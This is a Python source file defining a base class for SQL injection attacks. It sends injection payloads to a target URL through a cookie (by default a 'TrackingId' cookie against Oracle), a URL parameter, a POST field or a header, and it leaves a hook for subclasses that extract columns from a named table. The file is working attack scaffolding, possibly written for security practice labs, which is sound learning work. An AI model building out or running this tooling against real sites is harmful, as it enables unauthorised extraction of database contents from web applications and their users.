import requests

class BaseSQLi:
    def __init__(self, url, targetTable, db_type="oracle", inject_point=None, extra_cookies=None):
        self.url = url
        self.targetTable = targetTable
        self.db_type = db_type
        self.inject_point = inject_point or {"location": "cookie", "param": "TrackingId"}
        self.extra_cookies = extra_cookies or {}
        self.session = requests.Session()
        self._send_methods = {
            "cookie": self._sendCookie,
            "url_param": self._sendUrlParam,
            "post": self._sendPost,
            "header": self._sendHeader
        }

    def send(self, payload):
        location = self.inject_point["location"]
        if location in self._send_methods:
            return self._send_methods[location](payload)
        else:
            raise ValueError(f"Unsupported injection location: {location}")

    def extract(self, column):
        raise NotImplementedError("Subclasses should implement this method.")

    def _sendCookie(self, payload):
        param = self.inject_point["param"]
        cookies = {param: payload, **self.extra_cookies}
        return self.session.get(self.url, cookies=cookies)

    def _sendUrlParam(self, payload):
        param = self.inject_point["param"]
        return self.session.get(self.url, params={param: payload}, cookies=self.extra_cookies)

    def _sendPost(self, payload):
        param = self.inject_point["param"]
        return self.session.post(self.url, data={param: payload}, cookies=self.extra_cookies)

    def _sendHeader(self, payload):
        param = self.inject_point["param"]
        headers = {param: payload}
        return self.session.get(self.url, headers=headers, cookies=self.extra_cookies)
